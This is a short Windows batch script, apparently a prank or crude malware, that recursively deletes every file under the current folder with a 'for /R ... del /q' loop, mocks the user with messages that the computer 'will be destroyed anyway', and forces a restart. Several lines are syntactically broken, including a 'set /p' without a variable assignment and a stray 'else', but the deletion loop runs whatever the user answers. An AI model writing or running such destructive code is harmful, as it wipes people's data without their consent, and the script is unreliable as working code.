@echo off
setlocal EnableDelayedExpansion
set "dest=%temp%\delete_files"
md "%dest%" 2>nul
if exist "%dest%" (
 echo Deleting Files...
 for /R %%i in (*) do del /q %%i
) else (
 echo No files found
)
echo Are you cool? (y/n)
set /p answer
if %answer% == y goto destroy
else (
 echo You are not cool, and your computer will be destroyed anyway!
 goto destroy
)
:destroy
echo This is going to hurt me as much as it hurts you...
echo Your computer is now being destroyed! Press any key to continue...
pause > nul
shutdown -r